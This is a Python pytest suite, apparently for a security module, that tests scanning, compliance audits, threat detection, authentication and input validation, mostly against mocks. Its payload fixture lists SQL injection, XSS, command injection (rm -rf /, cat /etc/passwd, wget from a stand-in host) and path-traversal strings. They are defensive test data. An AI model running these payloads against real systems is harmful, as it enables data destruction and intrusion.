"""
Comprehensive Security Validation Test Suite

This module provides extensive security testing to validate all security controls,
compliance frameworks, and threat detection mechanisms.
"""

import pytest
import asyncio
import json
import time
from typing import Dict, List, Any, Optional
from unittest.mock import AsyncMock, MagicMock, patch
import hashlib
import jwt
import base64
from datetime import datetime, timedelta

# Security framework imports
from src.packages.data.anomaly_detection.src.anomaly_detection.application.services.security.vulnerability_scanner import VulnerabilityScanner
from src.packages.data.anomaly_detection.src.anomaly_detection.application.services.security.compliance_auditor import ComplianceAuditor
from src.packages.data.anomaly_detection.src.anomaly_detection.application.services.security.threat_detector import ThreatDetectionSystem
from src.packages.data.anomaly_detection.src.anomaly_detection.infrastructure.security.security_middleware import SecurityMiddleware
from src.packages.data.anomaly_detection.src.anomaly_detection.infrastructure.security.authentication_hardening import AuthenticationHardening


class SecurityTestFramework:
    """Framework for comprehensive security testing"""
    
    def __init__(self):
        self.test_results = {}
        self.vulnerabilities_found = []
        self.compliance_gaps = []
        self.threats_detected = []
    
    def record_finding(self, category: str, severity: str, description: str, details: Dict = None):
        """Record a security finding"""
        finding = {
            'category': category,
            'severity': severity,
            'description': description,
            'details': details or {},
            'timestamp': datetime.utcnow().isoformat()
        }
        
        if category == 'vulnerability':
            self.vulnerabilities_found.append(finding)
        elif category == 'compliance':
            self.compliance_gaps.append(finding)
        elif category == 'threat':
            self.threats_detected.append(finding)
    
    def generate_security_report(self) -> Dict[str, Any]:
        """Generate comprehensive security test report"""
        return {
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities_found),
                'total_compliance_gaps': len(self.compliance_gaps),
                'total_threats': len(self.threats_detected),
                'high_severity_issues': len([f for f in self.vulnerabilities_found + self.compliance_gaps + self.threats_detected if f['severity'] == 'high']),
                'test_completion_time': datetime.utcnow().isoformat()
            },
            'vulnerabilities': self.vulnerabilities_found,
            'compliance_gaps': self.compliance_gaps,
            'threats_detected': self.threats_detected,
            'recommendations': self._generate_recommendations()
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []
        
        if len(self.vulnerabilities_found) > 0:
            recommendations.append("Implement automated vulnerability scanning in CI/CD pipeline")
            recommendations.append("Establish regular security patching schedule")
        
        if len(self.compliance_gaps) > 0:
            recommendations.append("Conduct compliance training for development teams")
            recommendations.append("Implement automated compliance checking")
        
        if len(self.threats_detected) > 0:
            recommendations.append("Enhance threat detection monitoring")
            recommendations.append("Implement automated incident response procedures")
        
        return recommendations


class TestComprehensiveSecurityValidation:
    """Comprehensive security validation test suite"""
    
    @pytest.fixture
    def security_framework(self):
        """Initialize security testing framework"""
        return SecurityTestFramework()
    
    @pytest.fixture
    async def security_services(self):
        """Set up security services for testing"""
        services = {
            'vulnerability_scanner': VulnerabilityScanner(),
            'compliance_auditor': ComplianceAuditor(),
            'threat_detector': ThreatDetectionSystem(),
            'security_middleware': SecurityMiddleware(),
            'auth_hardening': AuthenticationHardening()
        }
        
        # Initialize services
        for service in services.values():
            if hasattr(service, 'initialize'):
                await service.initialize()
        
        yield services
        
        # Cleanup
        for service in services.values():
            if hasattr(service, 'cleanup'):
                await service.cleanup()
    
    @pytest.fixture
    def malicious_payloads(self):
        """Generate various malicious payloads for testing"""
        return {
            'sql_injection': [
                "'; DROP TABLE users; --",
                "' OR '1'='1' --",
                "'; UPDATE users SET admin=1; --",
                "' UNION SELECT * FROM sensitive_data --"
            ],
            'xss_payloads': [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ],
            'command_injection': [
                "; ls -la",
                "| cat /etc/passwd",
                "&& rm -rf /",
                "; wget malicious.com/payload"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd"
            ]
        }
    
    @pytest.mark.asyncio
    async def test_vulnerability_scanning_comprehensive(self, security_services, security_framework):
        """Test comprehensive vulnerability scanning"""
        scanner = security_services['vulnerability_scanner']
        
        # Mock vulnerability scanning results
        with patch.object(scanner, 'scan_dependencies') as mock_deps, \
             patch.object(scanner, 'scan_code_analysis') as mock_code, \
             patch.object(scanner, 'scan_api_security') as mock_api:
            
            # Simulate various vulnerability types
            mock_deps.return_value = {
                'vulnerabilities': [
                    {
                        'id': 'CVE-2024-001',
                        'severity': 'high',
                        'component': 'requests',
                        'version': '2.25.0',
                        'description': 'HTTP request smuggling vulnerability',
                        'fix_version': '2.28.0'
                    },
                    {
                        'id': 'CVE-2024-002',
                        'severity': 'medium',
                        'component': 'pillow',
                        'version': '8.0.0',
                        'description': 'Buffer overflow in image processing',
                        'fix_version': '9.0.0'
                    }
                ]
            }
            
            mock_code.return_value = {
                'issues': [
                    {
                        'type': 'hardcoded_secret',
                        'severity': 'critical',
                        'file': 'config.py',
                        'line': 42,
                        'description': 'Hardcoded API key detected'
                    },
                    {
                        'type': 'weak_crypto',
                        'severity': 'medium',
                        'file': 'auth.py',
                        'line': 15,
                        'description': 'Weak hashing algorithm (MD5) used'
                    }
                ]
            }
            
            mock_api.return_value = {
                'vulnerabilities': [
                    {
                        'endpoint': '/api/v1/admin',
                        'severity': 'high',
                        'type': 'missing_authentication',
                        'description': 'Admin endpoint accessible without authentication'
                    }
                ]
            }
            
            # Execute comprehensive scan
            scan_results = await scanner.scan_system()
            
            # Validate scan results
            assert 'vulnerabilities' in scan_results
            assert scan_results['scan_id'] is not None
            assert scan_results['risk_score'] >= 0
            
            # Record findings
            for vuln in scan_results.get('vulnerabilities', []):
                security_framework.record_finding(
                    'vulnerability',
                    vuln.get('severity', 'unknown'),
                    vuln.get('description', 'Unknown vulnerability'),
                    vuln
                )
    
    @pytest.mark.asyncio
    async def test_compliance_framework_validation(self, security_services, security_framework):
        """Test compliance framework validation"""
        auditor = security_services['compliance_auditor']
        
        with patch.object(auditor, 'audit_gdpr_compliance') as mock_gdpr, \
             patch.object(auditor, 'audit_hipaa_compliance') as mock_hipaa:
            
            # Mock GDPR compliance audit
            mock_gdpr.return_value = {
                'compliance_score': 0.85,
                'requirements_met': 28,
                'requirements_total': 35,
                'gaps': [
                    {
                        'requirement': 'Article 17 - Right to erasure',
                        'status': 'partial',
                        'description': 'Data deletion process not fully automated',
                        'remediation': 'Implement automated data deletion workflows'
                    },
                    {
                        'requirement': 'Article 25 - Data protection by design',
                        'status': 'missing',
                        'description': 'Privacy impact assessments not conducted',
                        'remediation': 'Establish PIA process for new features'
                    }
                ]
            }
            
            # Mock HIPAA compliance audit
            mock_hipaa.return_value = {
                'compliance_score': 0.78,
                'requirements_met': 45,
                'requirements_total': 58,
                'gaps': [
                    {
                        'requirement': '164.312(a)(1) - Access Control',
                        'status': 'partial',
                        'description': 'Role-based access controls incomplete',
                        'remediation': 'Implement fine-grained RBAC system'
                    },
                    {
                        'requirement': '164.308(a)(5)(ii)(D) - Password Management',
                        'status': 'missing',
                        'description': 'Password complexity requirements insufficient',
                        'remediation': 'Enforce stronger password policies'
                    }
                ]
            }
            
            # Execute compliance audits
            gdpr_result = await auditor.audit_gdpr_compliance()
            hipaa_result = await auditor.audit_hipaa_compliance()
            
            # Validate compliance results
            assert gdpr_result['compliance_score'] >= 0.0
            assert hipaa_result['compliance_score'] >= 0.0
            
            # Record compliance gaps
            for gap in gdpr_result.get('gaps', []):
                security_framework.record_finding(
                    'compliance',
                    'medium' if gap['status'] == 'partial' else 'high',
                    f"GDPR: {gap['description']}",
                    gap
                )
            
            for gap in hipaa_result.get('gaps', []):
                security_framework.record_finding(
                    'compliance',
                    'medium' if gap['status'] == 'partial' else 'high',
                    f"HIPAA: {gap['description']}",
                    gap
                )
    
    @pytest.mark.asyncio
    async def test_threat_detection_comprehensive(self, security_services, security_framework):
        """Test comprehensive threat detection"""
        threat_detector = security_services['threat_detector']
        
        # Generate suspicious activity patterns
        suspicious_events = [
            # Brute force attack pattern
            {'type': 'login_attempt', 'ip': '192.168.1.100', 'success': False, 'timestamp': '2024-01-01T10:00:00'},
            {'type': 'login_attempt', 'ip': '192.168.1.100', 'success': False, 'timestamp': '2024-01-01T10:00:05'},
            {'type': 'login_attempt', 'ip': '192.168.1.100', 'success': False, 'timestamp': '2024-01-01T10:00:10'},
            {'type': 'login_attempt', 'ip': '192.168.1.100', 'success': False, 'timestamp': '2024-01-01T10:00:15'},
            {'type': 'login_attempt', 'ip': '192.168.1.100', 'success': True, 'timestamp': '2024-01-01T10:00:20'},
            
            # API abuse pattern
            {'type': 'api_request', 'ip': '10.0.0.50', 'endpoint': '/api/v1/data', 'count': 1000, 'timestamp': '2024-01-01T10:01:00'},
            {'type': 'api_request', 'ip': '10.0.0.50', 'endpoint': '/api/v1/data', 'count': 1500, 'timestamp': '2024-01-01T10:02:00'},
            
            # Suspicious data access
            {'type': 'data_access', 'user': 'user123', 'resource': 'sensitive_data', 'unusual_time': True, 'timestamp': '2024-01-01T03:00:00'}
        ]
        
        with patch.object(threat_detector, 'detect_brute_force') as mock_brute, \
             patch.object(threat_detector, 'detect_api_abuse') as mock_api_abuse, \
             patch.object(threat_detector, 'detect_anomalous_access') as mock_anomalous:
            
            mock_brute.return_value = {
                'threats_detected': 1,
                'threat_type': 'brute_force',
                'severity': 'high',
                'source_ip': '192.168.1.100',
                'attempts': 5,
                'success_rate': 0.2,
                'recommendation': 'Block IP address and implement rate limiting'
            }
            
            mock_api_abuse.return_value = {
                'threats_detected': 1,
                'threat_type': 'api_abuse',
                'severity': 'medium',
                'source_ip': '10.0.0.50',
                'request_rate': 2500,
                'normal_rate': 50,
                'recommendation': 'Implement API rate limiting and monitoring'
            }
            
            mock_anomalous.return_value = {
                'threats_detected': 1,
                'threat_type': 'suspicious_access',
                'severity': 'medium',
                'user': 'user123',
                'anomaly_score': 0.85,
                'recommendation': 'Review user access patterns and permissions'
            }
            
            # Execute threat detection
            threat_results = await threat_detector.analyze_threats(suspicious_events)
            
            # Validate threat detection
            assert threat_results['threats_detected'] >= 0
            assert isinstance(threat_results.get('threat_types', []), list)
            
            # Record threats
            for threat_type in threat_results.get('threat_types', []):
                security_framework.record_finding(
                    'threat',
                    'high',  # Assume high severity for detected threats
                    f"Threat detected: {threat_type}",
                    {'threat_type': threat_type, 'details': threat_results}
                )
    
    @pytest.mark.asyncio
    async def test_authentication_security_hardening(self, security_services):
        """Test authentication security hardening"""
        auth_hardening = security_services['auth_hardening']
        
        # Test password policy enforcement
        weak_passwords = ['123456', 'password', 'qwerty', 'admin', '12345678']
        strong_passwords = ['Str0ng!P@ssw0rd123', 'My$ecur3P@ssw0rd!', 'C0mpl3x#P@ssw0rd$']
        
        with patch.object(auth_hardening, 'validate_password_strength') as mock_validate:
            # Mock password validation
            def validate_password(password):
                if password in weak_passwords:
                    return {'valid': False, 'issues': ['too_weak', 'common_password']}
                else:
                    return {'valid': True, 'strength_score': 0.9}
            
            mock_validate.side_effect = validate_password
            
            # Test weak passwords
            for weak_pwd in weak_passwords:
                result = await auth_hardening.validate_password_strength(weak_pwd)
                assert not result['valid'], f"Weak password '{weak_pwd}' should be rejected"
            
            # Test strong passwords
            for strong_pwd in strong_passwords:
                result = await auth_hardening.validate_password_strength(strong_pwd)
                assert result['valid'], f"Strong password should be accepted"
        
        # Test MFA implementation
        with patch.object(auth_hardening, 'setup_mfa') as mock_mfa:
            mock_mfa.return_value = {
                'mfa_enabled': True,
                'backup_codes_generated': 10,
                'qr_code': 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=='
            }
            
            mfa_result = await auth_hardening.setup_mfa('test_user')
            assert mfa_result['mfa_enabled']
            assert mfa_result['backup_codes_generated'] == 10
        
        # Test session security
        with patch.object(auth_hardening, 'validate_session_security') as mock_session:
            mock_session.return_value = {
                'session_valid': True,
                'security_score': 0.95,
                'checks_passed': ['ip_validation', 'user_agent_validation', 'timeout_check']
            }
            
            session_result = await auth_hardening.validate_session_security('test_session_id')
            assert session_result['session_valid']
            assert session_result['security_score'] > 0.9
    
    @pytest.mark.asyncio
    async def test_input_validation_security(self, security_services, malicious_payloads):
        """Test input validation against malicious payloads"""
        security_middleware = security_services['security_middleware']
        
        with patch.object(security_middleware, 'validate_input') as mock_validate:
            # Mock input validation
            def validate_input(data, input_type):
                malicious_patterns = []
                for payload_type, payloads in malicious_payloads.items():
                    malicious_patterns.extend(payloads)
                
                for pattern in malicious_patterns:
                    if pattern in str(data):
                        return {
                            'valid': False,
                            'threat_detected': payload_type,
                            'risk_level': 'high',
                            'sanitized_data': data.replace(pattern, '[FILTERED]')
                        }
                
                return {'valid': True, 'risk_level': 'low'}
            
            mock_validate.side_effect = validate_input
            
            # Test SQL injection payloads
            for payload in malicious_payloads['sql_injection']:
                result = await security_middleware.validate_input(payload, 'sql_query')
                assert not result['valid'], f"SQL injection payload should be detected: {payload}"
                assert result['risk_level'] == 'high'
            
            # Test XSS payloads
            for payload in malicious_payloads['xss_payloads']:
                result = await security_middleware.validate_input(payload, 'user_input')
                assert not result['valid'], f"XSS payload should be detected: {payload}"
            
            # Test command injection payloads
            for payload in malicious_payloads['command_injection']:
                result = await security_middleware.validate_input(payload, 'system_command')
                assert not result['valid'], f"Command injection payload should be detected: {payload}"
            
            # Test path traversal payloads
            for payload in malicious_payloads['path_traversal']:
                result = await security_middleware.validate_input(payload, 'file_path')
                assert not result['valid'], f"Path traversal payload should be detected: {payload}"
    
    @pytest.mark.asyncio
    async def test_encryption_and_data_protection(self, security_services):
        """Test encryption and data protection mechanisms"""
        
        # Test data encryption at rest
        test_data = {
            'sensitive_info': 'user_social_security_number',
            'personal_data': 'user_email@example.com',
            'financial_data': 'credit_card_4111111111111111'
        }
        
        # Mock encryption service
        with patch('src.packages.data.anomaly_detection.src.anomaly_detection.infrastructure.security.encryption_service.EncryptionService') as mock_encryption:
            mock_encryption.return_value.encrypt_data = MagicMock(return_value={
                'encrypted_data': base64.b64encode(b'encrypted_content').decode(),
                'encryption_key_id': 'key_001',
                'algorithm': 'AES-256-GCM'
            })
            mock_encryption.return_value.decrypt_data = MagicMock(return_value={
                'decrypted_data': 'original_content',
                'verified': True
            })
            
            encryption_service = mock_encryption.return_value
            
            # Test data encryption
            for key, value in test_data.items():
                encrypted_result = encryption_service.encrypt_data(value)
                assert encrypted_result['encrypted_data'] is not None
                assert encrypted_result['encryption_key_id'] is not None
                
                # Test decryption
                decrypted_result = encryption_service.decrypt_data(encrypted_result['encrypted_data'])
                assert decrypted_result['verified']
        
        # Test TLS/SSL configuration
        with patch('ssl.create_default_context') as mock_ssl:
            mock_ssl.return_value.check_hostname = True
            mock_ssl.return_value.verify_mode = 2  # ssl.CERT_REQUIRED
            
            ssl_context = mock_ssl()
            assert ssl_context.check_hostname
            assert ssl_context.verify_mode == 2
    
    @pytest.mark.asyncio
    async def test_security_monitoring_and_alerting(self, security_services):
        """Test security monitoring and alerting systems"""
        
        # Mock security events
        security_events = [
            {'type': 'failed_login', 'severity': 'medium', 'count': 5},
            {'type': 'privilege_escalation', 'severity': 'high', 'count': 1},
            {'type': 'data_exfiltration', 'severity': 'critical', 'count': 1},
            {'type': 'suspicious_network_activity', 'severity': 'medium', 'count': 3}
        ]
        
        with patch('src.packages.data.anomaly_detection.src.anomaly_detection.infrastructure.monitoring.security_monitor.SecurityMonitor') as mock_monitor:
            mock_monitor.return_value.process_security_events = AsyncMock(return_value={
                'events_processed': len(security_events),
                'alerts_generated': 2,
                'high_priority_alerts': 1,
                'notifications_sent': ['security_team@company.com', 'soc@company.com']
            })
            
            security_monitor = mock_monitor.return_value
            result = await security_monitor.process_security_events(security_events)
            
            assert result['events_processed'] == len(security_events)
            assert result['alerts_generated'] > 0
            assert len(result['notifications_sent']) > 0
    
    @pytest.mark.asyncio
    async def test_api_security_comprehensive(self, security_services):
        """Test comprehensive API security"""
        
        # Test rate limiting
        with patch('src.packages.data.anomaly_detection.src.anomaly_detection.infrastructure.security.rate_limiter.RateLimiter') as mock_limiter:
            mock_limiter.return_value.is_allowed = MagicMock()
            
            # Simulate rate limiting scenarios
            def rate_limit_check(client_id, endpoint):
                if client_id == 'abusive_client':
                    return {'allowed': False, 'reason': 'rate_limit_exceeded', 'retry_after': 60}
                return {'allowed': True, 'remaining_requests': 95}
            
            mock_limiter.return_value.is_allowed.side_effect = rate_limit_check
            
            rate_limiter = mock_limiter.return_value
            
            # Test normal client
            result = rate_limiter.is_allowed('normal_client', '/api/v1/detect')
            assert result['allowed']
            
            # Test abusive client
            result = rate_limiter.is_allowed('abusive_client', '/api/v1/detect')
            assert not result['allowed']
            assert result['reason'] == 'rate_limit_exceeded'
        
        # Test API authentication
        with patch('src.packages.data.anomaly_detection.src.anomaly_detection.infrastructure.security.api_auth.APIAuthentication') as mock_auth:
            mock_auth.return_value.verify_token = MagicMock()
            
            def verify_token(token):
                if token == 'valid_token':
                    return {'valid': True, 'user_id': 'user123', 'permissions': ['read', 'write']}
                elif token == 'expired_token':
                    return {'valid': False, 'reason': 'token_expired'}
                else:
                    return {'valid': False, 'reason': 'invalid_token'}
            
            mock_auth.return_value.verify_token.side_effect = verify_token
            
            api_auth = mock_auth.return_value
            
            # Test valid token
            result = api_auth.verify_token('valid_token')
            assert result['valid']
            assert 'read' in result['permissions']
            
            # Test expired token
            result = api_auth.verify_token('expired_token')
            assert not result['valid']
            assert result['reason'] == 'token_expired'
            
            # Test invalid token
            result = api_auth.verify_token('invalid_token')
            assert not result['valid']
    
    @pytest.mark.asyncio
    async def test_security_incident_response(self, security_services, security_framework):
        """Test security incident response procedures"""
        
        # Simulate security incident
        incident_data = {
            'incident_id': 'INC-2024-001',
            'type': 'data_breach',
            'severity': 'critical',
            'affected_systems': ['database', 'api_gateway'],
            'potential_data_compromised': ['user_emails', 'encrypted_passwords'],
            'detection_time': '2024-01-01T10:00:00Z',
            'source_ip': '192.168.100.50'
        }
        
        with patch('src.packages.data.anomaly_detection.src.anomaly_detection.application.services.security.incident_response.IncidentResponseService') as mock_incident:
            mock_incident.return_value.handle_incident = AsyncMock(return_value={
                'incident_id': incident_data['incident_id'],
                'response_initiated': True,
                'containment_actions': [
                    'isolated_affected_systems',
                    'revoked_compromised_credentials',
                    'activated_backup_systems'
                ],
                'notification_status': {
                    'internal_teams_notified': True,
                    'external_authorities_notified': True,
                    'customers_notified': False  # Pending legal review
                },
                'estimated_impact': 'medium',
                'recovery_time_objective': '4_hours'
            })
            
            incident_service = mock_incident.return_value
            response = await incident_service.handle_incident(incident_data)
            
            # Validate incident response
            assert response['response_initiated']
            assert len(response['containment_actions']) > 0
            assert response['notification_status']['internal_teams_notified']
            
            # Record incident for reporting
            security_framework.record_finding(
                'threat',
                incident_data['severity'],
                f"Security incident: {incident_data['type']}",
                incident_data
            )
    
    def test_security_configuration_validation(self):
        """Test security configuration validation"""
        
        # Define security configuration requirements
        required_config = {
            'encryption': {
                'algorithm': 'AES-256-GCM',
                'key_rotation_days': 90,
                'at_rest_encryption': True,
                'in_transit_encryption': True
            },
            'authentication': {
                'mfa_required': True,
                'password_min_length': 12,
                'password_complexity': True,
                'session_timeout_minutes': 30
            },
            'network_security': {
                'firewall_enabled': True,
                'intrusion_detection': True,
                'ddos_protection': True,
                'vpc_isolation': True
            },
            'logging_monitoring': {
                'security_logging': True,
                'log_retention_days': 365,
                'real_time_alerting': True,
                'siem_integration': True
            }
        }
        
        # Mock configuration validation
        with patch('src.packages.data.anomaly_detection.src.anomaly_detection.infrastructure.config.security_config.SecurityConfig') as mock_config:
            mock_config.return_value.validate_configuration = MagicMock(return_value={
                'valid': True,
                'compliance_score': 0.95,
                'missing_requirements': [],
                'recommendations': [
                    'Consider implementing certificate pinning',
                    'Enable additional audit logging'
                ]
            })
            
            config_validator = mock_config.return_value
            validation_result = config_validator.validate_configuration(required_config)
            
            assert validation_result['valid']
            assert validation_result['compliance_score'] > 0.9
    
    def test_generate_comprehensive_security_report(self, security_framework):
        """Test comprehensive security report generation"""
        
        # Add sample findings to framework
        security_framework.record_finding(
            'vulnerability', 'high', 'SQL injection vulnerability in user input',
            {'cve': 'CVE-2024-001', 'affected_component': 'web_api'}
        )
        
        security_framework.record_finding(
            'compliance', 'medium', 'GDPR data retention policy incomplete',
            {'standard': 'GDPR', 'requirement': 'Article 5(1)(e)'}
        )
        
        security_framework.record_finding(
            'threat', 'high', 'Suspicious brute force attack detected',
            {'source_ip': '192.168.1.100', 'attempts': 50}
        )
        
        # Generate security report
        report = security_framework.generate_security_report()
        
        # Validate report structure
        assert 'summary' in report
        assert 'vulnerabilities' in report
        assert 'compliance_gaps' in report
        assert 'threats_detected' in report
        assert 'recommendations' in report
        
        # Validate report content
        assert report['summary']['total_vulnerabilities'] == 1
        assert report['summary']['total_compliance_gaps'] == 1
        assert report['summary']['total_threats'] == 1
        assert report['summary']['high_severity_issues'] == 2
        assert len(report['recommendations']) > 0
        
        print("Comprehensive Security Validation Report:")
        print(json.dumps(report, indent=2))


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])